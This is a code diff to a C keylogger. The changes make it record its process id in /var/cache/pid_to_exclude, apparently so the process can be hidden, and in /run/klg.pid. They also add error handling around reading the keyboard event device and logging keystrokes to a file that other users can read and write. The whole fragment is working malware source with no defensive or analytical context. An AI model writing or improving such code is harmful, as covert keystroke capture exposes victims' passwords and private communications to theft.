@@ -8,6 +8,7 @@ t_keylogger *getKlg()
 
 void	clean_quit(t_keylogger *klg, int code)
 {
+	// TODO add program cleaning here (pid_to_exclude, klg.pid, etc...)
 	close(klg->keyboardFD);
 	close(klg->saveFD);
 	close(klg->saveLineFD);
@@ -16,18 +17,32 @@ void	clean_quit(t_keylogger *klg, int code)
 	exit(code);
 }
 
-void	save_pid(t_keylogger *klg)
+int		save_pid(t_keylogger *klg)
 {
 	pid_t	pid;
 	int		fd;
+	char	*pidstr;
 
 	pid = getpid();
 	if (((fd = open("/var/cache/pid_to_exclude", O_RDWR | O_CREAT | O_TRUNC, 0666)) > -1)
 		&& (write(fd, &pid, sizeof(pid)) > -1))
 		dprintf(klg->logFD, "write pid with success: %d\n", pid);
 	else
-		dprintf(klg->logFD , "ERROR writing pid: %d\n", pid);
+	{
+		dprintf(klg->logFD , "ERROR writing /var/cache/pid_to_exclude: %d\n", pid);
+		return -1;
+	}
 	close(fd);
+	pidstr = ft_itoa(pid);
+	if (((fd = open("/run/klg.pid", O_RDWR | O_CREAT | O_TRUNC, 0666)) > -1)
+		&& (write(fd, pidstr, ft_strlen(pidstr)) > -1))
+		dprintf(klg->logFD, "write pid with success: %d\n", pid);
+	else
+	{
+		dprintf(klg->logFD , "ERROR writing /run/klg.pid: %d\n", pid);
+		return -1;
+	}
+	return 0;
 }
 
 void	selectKey(t_keylogger *klg)
@@ -72,8 +87,8 @@ int		openFiles(t_keylogger *klg)
 		dprintf(klg->logFD, "Fail to open file:\tklg.data\n");
 		return -1;
 	}
-	parseData(klg);
 	dprintf(klg->logFD, "open klg.data file with success\n");
+	parseData(klg);
 	if((klg->keyboardFD = open(klg->event_location, O_RDONLY)) <= 0)
 	{
 		dprintf(klg->logFD, "Fail to open file:\teventX-%s\n", klg->event_location);
@@ -102,7 +117,8 @@ void	keylogger(void)
 
 	klg = getKlg();
 	signal_handle(klg);
-	save_pid(klg);
+	if (save_pid(klg) != 0)
+		return ;
 	if (openFiles(klg) == -1)
 		return ;
 	chmod(LOGPATH "save.log", S_IROTH | S_IWOTH);
